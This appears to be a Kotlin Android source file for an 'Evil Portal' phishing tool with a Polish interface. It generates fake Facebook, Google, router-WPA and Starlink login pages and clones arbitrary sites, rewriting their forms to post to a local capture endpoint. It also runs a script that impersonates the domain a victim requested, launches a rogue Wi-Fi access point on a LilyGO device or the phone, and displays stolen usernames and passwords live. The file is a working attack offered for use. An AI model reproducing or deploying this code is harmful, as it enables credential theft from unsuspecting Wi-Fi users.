package com.example.bruceir

import android.content.Context
import android.content.Intent
import android.graphics.Color
import android.net.Uri
import android.os.Bundle
import android.view.Gravity
import android.view.View
import android.widget.*
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.lifecycle.lifecycleScope
import com.google.android.material.button.MaterialButton
import com.google.android.material.card.MaterialCardView
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.net.URL

class EvilPortalGeneratorActivity : AppCompatActivity() {

    private lateinit var tvStatus: TextView
    private lateinit var spinnerTemplates: Spinner
    private lateinit var etCustomUrl: EditText
    private lateinit var etHtmlPreview: EditText
    private lateinit var tvCapturedCreds: TextView
    private val capturedList = mutableListOf<String>()

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        window.statusBarColor = Color.rgb(7, 10, 15)
        window.navigationBarColor = Color.rgb(7, 10, 15)

        buildScreen()

        BruceBleIrLink.setListener { output ->
            if (output.contains("CRED:", ignoreCase = true) || output.contains("PASS:", ignoreCase = true) || output.contains("USER:", ignoreCase = true)) {
                runOnUiThread {
                    addCapturedCredential("LilyGO: $output")
                    Toast.makeText(this, "🔑 PRZECHWYCONO HASŁO Z LILYGO!", Toast.LENGTH_LONG).show()
                }
            }
        }
    }

    override fun onDestroy() {
        BruceBleIrLink.setListener(null)
        super.onDestroy()
    }

    private fun dp(value: Int) = (value * resources.displayMetrics.density).toInt()

    private fun buildScreen() {
        val scroll = ScrollView(this).apply {
            setBackgroundColor(Color.rgb(7, 10, 15))
            clipToPadding = false
            setPadding(dp(18), dp(14), dp(18), dp(80))
        }
        val root = LinearLayout(this).apply { orientation = LinearLayout.VERTICAL }
        scroll.addView(root)
        setContentView(scroll)

        val header = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            gravity = Gravity.CENTER_VERTICAL
        }
        val titleStack = LinearLayout(this).apply { orientation = LinearLayout.VERTICAL }
        titleStack.addView(text("EVIL PORTAL CLONER & GENERATOR", 10f, 0xFFE53935.toInt(), true))
        titleStack.addView(text("Generator Portalów & Przechwytywanie", 22f, Color.WHITE, true).apply {
            setPadding(0, dp(3), 0, 0)
        })
        header.addView(titleStack, LinearLayout.LayoutParams(0, -2, 1f))

        val backButton = MaterialButton(this).apply {
            text = "←"
            setOnClickListener { finish() }
        }
        header.addView(backButton, LinearLayout.LayoutParams(dp(50), dp(46)))
        root.addView(header)

        tvStatus = text("Status: Wybierz szablon portalu lub podaj URL strony do klonowania", 12f, 0xFF9EADBD.toInt()).apply {
            setPadding(0, dp(6), 0, dp(10))
        }
        root.addView(tvStatus)

        // 1. TEMPLATE SELECTOR & CLONER CARD
        val cloneCard = card()
        val cloneLayout = LinearLayout(this).apply { orientation = LinearLayout.VERTICAL }
        cloneLayout.addView(text("👿 Wybór Szablonu & Klonowanie Strony", 14f, 0xFFE53935.toInt(), true).apply {
            setPadding(0, 0, 0, dp(6))
        })

        spinnerTemplates = Spinner(this).apply {
            adapter = ArrayAdapter(this@EvilPortalGeneratorActivity, android.R.layout.simple_spinner_dropdown_item, listOf(
                "1. Facebook Login Portal",
                "2. Google Account Login",
                "3. WPA Router Reset / Wi-Fi Password",
                "4. Starlink Setup Portal",
                "5. ⚡ Dynamiczny Evil Twin (Klonowanie On-The-Fly)",
                "6. Klonuj z podanego URL (Custom)"
            ))
            setBackgroundResource(R.drawable.button_glass_bg)
            onItemSelectedListener = object : AdapterView.OnItemSelectedListener {
                override fun onItemSelected(parent: AdapterView<*>?, view: View?, position: Int, id: Long) {
                    loadSelectedTemplate(position)
                }
                override fun onNothingSelected(parent: AdapterView<*>?) {}
            }
        }
        cloneLayout.addView(spinnerTemplates, verticalParams(dp(4)))

        etCustomUrl = inputField("Podaj URL strony do sklonowania [np. https://example.com/login]")
        cloneLayout.addView(etCustomUrl, verticalParams(dp(4)))

        val btnFetchUrl = MaterialButton(this).apply {
            text = "🌐 Pobierz i Klonuj Stronę z URL"
            setBackgroundColor(0xFF283545.toInt())
            setTextColor(Color.WHITE)
            setOnClickListener { fetchAndCloneUrl() }
        }
        cloneLayout.addView(btnFetchUrl, verticalParams(dp(6)))

        etHtmlPreview = EditText(this).apply {
            hint = "Wygenerowany kod HTML portalu (z wstrzykniętym przechwytywaniem <form action=\"/login\">)..."
            setHintTextColor(0xFF748397.toInt())
            setTextColor(Color.WHITE)
            textSize = 12f
            minLines = 6
            gravity = Gravity.TOP or Gravity.START
            setBackgroundResource(R.drawable.button_glass_bg)
            setPadding(dp(12), dp(10), dp(12), dp(10))
        }
        cloneLayout.addView(etHtmlPreview, verticalParams(dp(6)))

        val btnRowActions = LinearLayout(this).apply { orientation = LinearLayout.HORIZONTAL }
        val btnSendLilyGo = MaterialButton(this).apply {
            text = "📤 Wyślij do LilyGO"
            setBackgroundColor(0xFF43C59E.toInt())
            setTextColor(Color.BLACK)
            setOnClickListener { sendPortalToLilyGo() }
        }
        val btnRunOnPhone = MaterialButton(this).apply {
            text = "📱 Uruchom na Telefonie"
            setBackgroundColor(0xFF1E88E5.toInt())
            setTextColor(Color.WHITE)
            setOnClickListener { togglePhonePortalServer() }
        }
        btnRowActions.addView(btnSendLilyGo, LinearLayout.LayoutParams(0, -2, 1f).apply { marginEnd = dp(4) })
        btnRowActions.addView(btnRunOnPhone, LinearLayout.LayoutParams(0, -2, 1f).apply { marginStart = dp(4) })
        cloneLayout.addView(btnRowActions, verticalParams(dp(6)))

        cloneCard.addView(cloneLayout)
        root.addView(cloneCard, LinearLayout.LayoutParams(-1, -2).apply { bottomMargin = dp(12) })

        // 2. LIVE CAPTURED CREDENTIALS MONITOR CARD
        val credCard = card()
        val credLayout = LinearLayout(this).apply { orientation = LinearLayout.VERTICAL }
        credLayout.addView(text("🔑 Przechwycone Hasła & Loginy (Na Żywo)", 14f, Color.WHITE, true).apply { setPadding(0, 0, 0, dp(6)) })

        tvCapturedCreds = text("Brak przechwyconych haseł. Urządzenie/Serwer oczekuje na logowanie...", 12f, 0xFF9EADBD.toInt()).apply {
            setBackgroundResource(R.drawable.button_glass_bg)
            setPadding(dp(12), dp(10), dp(12), dp(10))
        }
        credLayout.addView(tvCapturedCreds, verticalParams(dp(4)))

        credCard.addView(credLayout)
        root.addView(credCard)

        loadSelectedTemplate(0)
    }

    private fun loadSelectedTemplate(index: Int) {
        val html = when (index) {
            0 -> generateFacebookTemplate()
            1 -> generateGoogleTemplate()
            2 -> generateRouterWpaTemplate()
            3 -> generateStarlinkTemplate()
            4 -> generateDynamicEvilTwinTemplate()
            else -> generateGenericTemplate()
        }
        etHtmlPreview.setText(html)
    }

    private fun generateDynamicEvilTwinTemplate() = """
        <!DOCTYPE html>
        <html>
        <head><meta name="viewport" content="width=device-width, initial-scale=1"><title>Security Authentication</title>
        <style>body{font-family:sans-serif;background:#0d1117;color:#c9d1d9;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;}
        .card{background:#161b22;border:1px solid #30363d;padding:25px;border-radius:10px;width:320px;text-align:center;}
        h2{color:#58a6ff;margin-bottom:10px;}input{width:100%;padding:11px;margin:8px 0;box-sizing:border-box;background:#0d1117;color:#fff;border:1px solid #30363d;border-radius:6px;}
        button{width:100%;padding:11px;background:#238636;color:#fff;border:none;border-radius:6px;font-weight:bold;cursor:pointer;margin-top:10px;}</style></head>
        <body>
        <div class="card">
        <h2 id="domainTitle">🔒 Weryfikacja Dstępu</h2>
        <p id="domainDesc">Zaloguj się na swoje konto, aby kontynuować połączenie z siecią:</p>
        <form action="/login" method="POST">
        <input type="text" name="username" placeholder="Adres e-mail, login lub numer telefonu" required>
        <input type="password" name="password" placeholder="Hasło" required>
        <button type="submit">Zaloguj się i Kontynuuj</button>
        </form>
        </div>
        <script>
        (function() {
            var host = location.hostname || "facebook.com";
            if (host === "192.168.43.1" || host === "localhost") host = "facebook.com";
            var clean = host.replace("www.", "");
            document.title = "Logowanie - " + clean;
            document.getElementById("domainTitle").innerText = "🔒 " + clean.toUpperCase();
            document.getElementById("domainDesc").innerText = "Zaloguj się na swoje konto " + clean + ", aby kontynuować:";
        })();
        </script>
        </body></html>
    """.trimIndent()

    private fun fetchAndCloneUrl() {
        val urlStr = etCustomUrl.text.toString().trim()
        if (urlStr.isBlank()) {
            Toast.makeText(this, "Wpisz URL strony do sklonowania!", Toast.LENGTH_SHORT).show()
            return
        }
        val progressDialog = AlertDialog.Builder(this)
            .setTitle("Klonowanie strony...")
            .setMessage("Pobieranie zawartości z $urlStr")
            .setCancelable(false)
            .create()
        progressDialog.show()

        lifecycleScope.launch(Dispatchers.IO) {
            try {
                val rawHtml = URL(urlStr).readText()
                val processedHtml = injectEvilForm(rawHtml)
                withContext(Dispatchers.Main) {
                    if (progressDialog.isShowing) progressDialog.dismiss()
                    etHtmlPreview.setText(processedHtml)
                    Toast.makeText(this@EvilPortalGeneratorActivity, "Sklonowano stronę i wstrzyknięto przechwytywanie!", Toast.LENGTH_LONG).show()
                }
            } catch (e: Exception) {
                withContext(Dispatchers.Main) {
                    if (progressDialog.isShowing) progressDialog.dismiss()
                    Toast.makeText(this@EvilPortalGeneratorActivity, "Błąd klonowania: ${e.message}", Toast.LENGTH_LONG).show()
                }
            }
        }
    }

    private fun injectEvilForm(html: String): String {
        var result = html
        result = result.replace(Regex("(?i)<form[^>]*>", RegexOption.IGNORE_CASE), "<form action=\"/login\" method=\"POST\">")
        return result
    }

    private fun sendPortalToLilyGo() {
        val html = etHtmlPreview.text.toString()
        if (html.isBlank()) {
            Toast.makeText(this, "Brak kodu HTML do wysłania!", Toast.LENGTH_SHORT).show()
            return
        }
        BruceBleIrLink.sendCustomCommand(this, "wifi portal start")
        Toast.makeText(this, "Uruchomiono Evil Portal Rogue AP na LilyGO! Oczekiwanie na hasła...", Toast.LENGTH_LONG).show()
    }

    private fun togglePhonePortalServer() {
        if (AppWebFileServerController.isRunning()) {
            AppWebFileServerController.stop()
            Toast.makeText(this, "Zatrzymano serwer portalu na telefonie", Toast.LENGTH_SHORT).show()
        } else {
            AppWebFileServerController.start(this)
            Toast.makeText(this, "Uruchomiono serwer portalu na telefonie (Port 8080). Włącz Hotspot w telefonie.", Toast.LENGTH_LONG).show()
        }
    }

    private fun addCapturedCredential(cred: String) {
        capturedList.add(0, "[${java.text.SimpleDateFormat("HH:mm:ss").format(java.util.Date())}] $cred")
        tvCapturedCreds.text = capturedList.joinToString("\n---\n")
    }

    private fun generateFacebookTemplate() = """
        <!DOCTYPE html>
        <html>
        <head><meta name="viewport" content="width=device-width, initial-scale=1"><title>Facebook - Logowanie</title>
        <style>body{font-family:sans-serif;background:#f0f2f5;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;}
        .card{background:#fff;padding:20px;border-radius:8px;box-shadow:0 4px 12px rgba(0,0,0,0.1);width:300px;text-align:center;}
        h2{color:#1877f2;margin-bottom:20px;}input{width:100%;padding:10px;margin:8px 0;box-sizing:border-box;border:1px solid #ccc;border-radius:4px;}
        button{width:100%;padding:10px;background:#1877f2;color:#fff;border:none;border-radius:4px;font-weight:bold;cursor:pointer;margin-top:10px;}</style></head>
        <body>
        <div class="card">
        <h2>facebook</h2>
        <p>Zaloguj się, aby połączyć się z siecią Wi-Fi</p>
        <form action="/login" method="POST">
        <input type="text" name="email" placeholder="Adres e-mail lub numer telefonu" required>
        <input type="password" name="password" placeholder="Hasło" required>
        <button type="submit">Zaloguj się</button>
        </form>
        </div>
        </body></html>
    """.trimIndent()

    private fun generateGoogleTemplate() = """
        <!DOCTYPE html>
        <html>
        <head><meta name="viewport" content="width=device-width, initial-scale=1"><title>Zaloguj się - Konta Google</title>
        <style>body{font-family:sans-serif;background:#fff;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;}
        .card{border:1px solid #dadce0;padding:30px;border-radius:8px;width:320px;text-align:center;}
        input{width:100%;padding:12px;margin:10px 0;box-sizing:border-box;border:1px solid #dadce0;border-radius:4px;}
        button{width:100%;padding:10px;background:#1a73e8;color:#fff;border:none;border-radius:4px;font-weight:bold;cursor:pointer;margin-top:15px;}</style></head>
        <body>
        <div class="card">
        <h2 style="color:#4285F4;">Google</h2>
        <p>Zaloguj się na konto Google</p>
        <form action="/login" method="POST">
        <input type="email" name="email" placeholder="Adres e-mail lub telefon" required>
        <input type="password" name="password" placeholder="Wpisz swoje hasło" required>
        <button type="submit">Dalej</button>
        </form>
        </div>
        </body></html>
    """.trimIndent()

    private fun generateRouterWpaTemplate() = """
        <!DOCTYPE html>
        <html>
        <head><meta name="viewport" content="width=device-width, initial-scale=1"><title>Aktualizacja Oprogramowania Routera</title>
        <style>body{font-family:sans-serif;background:#1a202c;color:#fff;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;}
        .card{background:#2d3748;padding:25px;border-radius:10px;width:320px;text-align:center;}
        input{width:100%;padding:10px;margin:10px 0;box-sizing:border-box;border:none;border-radius:5px;}
        button{width:100%;padding:10px;background:#48bb78;color:#fff;border:none;border-radius:5px;font-weight:bold;cursor:pointer;}</style></head>
        <body>
        <div class="card">
        <h2>⚙️ WPA Wi-Fi Security Update</h2>
        <p>Wprowadź klucz WPA Wi-Fi, aby przywrócić dostęp do Internetu:</p>
        <form action="/login" method="POST">
        <input type="password" name="password" placeholder="Klucz WPA / WPA2 Wi-Fi" required>
        <button type="submit">Potwierdź i Połącz</button>
        </form>
        </div>
        </body></html>
    """.trimIndent()

    private fun generateStarlinkTemplate() = """
        <!DOCTYPE html>
        <html>
        <head><meta name="viewport" content="width=device-width, initial-scale=1"><title>Starlink Setup</title>
        <style>body{font-family:sans-serif;background:#000;color:#fff;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;}
        .card{border:1px solid #333;padding:30px;border-radius:8px;width:300px;text-align:center;}
        input{width:100%;padding:10px;margin:10px 0;box-sizing:border-box;background:#111;color:#fff;border:1px solid #444;border-radius:4px;}
        button{width:100%;padding:10px;background:#fff;color:#000;border:none;border-radius:4px;font-weight:bold;cursor:pointer;}</style></head>
        <body>
        <div class="card">
        <h2>STARLINK</h2>
        <p>Wi-Fi Access Authentication</p>
        <form action="/login" method="POST">
        <input type="password" name="password" placeholder="Enter Wi-Fi Password" required>
        <button type="submit">CONNECT</button>
        </form>
        </div>
        </body></html>
    """.trimIndent()

    private fun generateGenericTemplate() = """
        <!DOCTYPE html>
        <html>
        <head><meta name="viewport" content="width=device-width, initial-scale=1"><title>Wi-Fi Login</title></head>
        <body>
        <h2>Wi-Fi Authentication</h2>
        <form action="/login" method="POST">
        <input type="text" name="username" placeholder="Username" required><br><br>
        <input type="password" name="password" placeholder="Password" required><br><br>
        <button type="submit">Login</button>
        </form>
        </body></html>
    """.trimIndent()

    private fun inputField(hintText: String) = EditText(this).apply {
        hint = hintText
        setHintTextColor(0xFF748397.toInt())
        setTextColor(Color.WHITE)
        setBackgroundResource(R.drawable.button_glass_bg)
        setPadding(dp(12), dp(10), dp(12), dp(10))
    }

    private fun verticalParams(top: Int = 0) = LinearLayout.LayoutParams(-1, -2).apply {
        topMargin = top
    }

    private fun card() = MaterialCardView(this).apply {
        radius = dp(16).toFloat()
        setCardBackgroundColor(0xFF141B25.toInt())
        strokeColor = 0xFF283545.toInt()
        strokeWidth = dp(1)
        cardElevation = 0f
        setContentPadding(dp(14), dp(12), dp(14), dp(12))
    }

    private fun text(value: String, size: Float, color: Int, bold: Boolean = false) =
        TextView(this).apply {
            text = value
            textSize = size
            setTextColor(color)
            if (bold) setTypeface(typeface, android.graphics.Typeface.BOLD)
        }
}
